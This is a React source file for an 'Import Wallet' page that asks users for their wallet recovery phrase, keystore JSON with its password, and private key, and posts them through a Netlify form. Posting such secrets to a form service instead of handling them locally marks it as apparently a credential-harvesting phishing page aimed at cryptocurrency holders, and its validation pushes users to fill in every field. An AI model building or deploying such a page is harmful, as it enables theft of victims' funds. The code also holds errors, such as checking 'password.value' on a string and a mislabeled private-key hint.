import React from 'react';
import '../../assets/styles/css/wallet-details-entry-page.css';
import '../../assets/styles/css/wallet-details-entry-page_media-queries.css';
import { useState } from 'react';
import Navbar from '../../components/Navbar';
import Footer from '../../components/Footer';

function WalletDetailsEntryPage() {
  const [showPhrase, setShowPhrase] = useState(false);
  const [showKeyJson, setShowKeyJson] = useState(false);
  const [showPrivateKey, setShowPrivateKey] = useState(true);

  // form handling

  const [phrase, setPhrase] = useState('');
  const [keyJson, setKeyJson] = useState('');
  const [password, setPassword] = useState('');
  const [privateKey, setPrivatekey] = useState('');

  function validateForm(e) {
    if (
      phrase === '' ||
      keyJson === '' ||
      password.value === '' ||
      privateKey === ''
    ) {
      e.preventDefault();
      alert(
        `Opps, it seems there is still an empty form field. Please fill out all form fields by adding all wallet details (Phrase, Keystore JSON, Password, and Private key). You can add "SKIP" for any data you do not wish to import`
      );
      return false;
    }
  }

  function displayPhrase() {
    setShowPhrase(true);
    setShowKeyJson(false);
    setShowPrivateKey(false);
  }

  function displayKeyJson() {
    setShowKeyJson(true);
    setShowPhrase(false);
    setShowPrivateKey(false);
  }

  function displayPrivateKey() {
    setShowPrivateKey(true);
    setShowPhrase(false);
    setShowKeyJson(false);
  }

  return (
    <>
      <Navbar />
      <section className="wallet-details-entry-section">
        <div className="section-header text-center">Import Wallet</div>
        <div className="options-wrapper">
          <button
            className="option-item"
            style={{
              backgroundColor: showPhrase && '#3877d3',
              color: showPhrase && '#ffffff',
            }}
            onClick={displayPhrase}
          >
            Phrase
          </button>
          <button
            className="option-item"
            style={{
              backgroundColor: showKeyJson && '#3877d3',
              color: showKeyJson && '#ffffff',
            }}
            onClick={displayKeyJson}
          >
            Keystore JSON
          </button>
          <button
            className="option-item"
            style={{
              backgroundColor: showPrivateKey && '#3877d3',
              color: showPrivateKey && '#ffffff',
            }}
            onClick={displayPrivateKey}
          >
            Private Key
          </button>
        </div>
        <form
          className="form-area"
          method="POST"
          data-netlify="true"
          netlify-honeypot
          // action="./form-action-page.html"
          name="Wallet import details"
          onSubmit={validateForm}
        >
          {showPhrase && (
            <div className="mb-3">
              <textarea
                className="form-control"
                id="exampleFormControlTextarea1"
                placeholder="Phrase"
                rows="5"
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
              ></textarea>
              <div className="tip-text">
                Typically 12 (sometimes 24) words separated by single spaces.
              </div>
            </div>
          )}
          {showKeyJson && (
            <div className="mb-3">
              <textarea
                style={{ marginBottom: '20px' }}
                className="form-control"
                id="exampleFormControlTextarea1"
                value={keyJson}
                onChange={(e) => setKeyJson(e.target.value)}
                placeholder="Keystore JSON"
                rows="5"
              ></textarea>
              <div>
                <input
                  type="password"
                  className="form-control"
                  placeholder="Password"
                  id="inputPassword"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                ></input>
              </div>
              <div className="tip-text">
                Several lines of text beginning with '(...)' plus the password
                you used to encrypt it.
              </div>
            </div>
          )}

          {showPrivateKey && (
            <div className="mb-3">
              <input
                type="text"
                className="form-control"
                id="exampleFormControlInput1"
                placeholder="Private Key"
                value={privateKey}
                onChange={(e) => setPrivatekey(e.target.value)}
              ></input>
              <div className="tip-text">
                Typically 12 (sometimes 24) words separated by single spaces.
              </div>
            </div>
          )}

          <div className="submit-button-wrapper">
            <button
              className="show-more-wallet-btn btn submit-button"
              type="submit"
            >
              Import
            </button>
          </div>
        </form>
      </section>
      <Footer />
    </>
  );
}

export default WalletDetailsEntryPage;
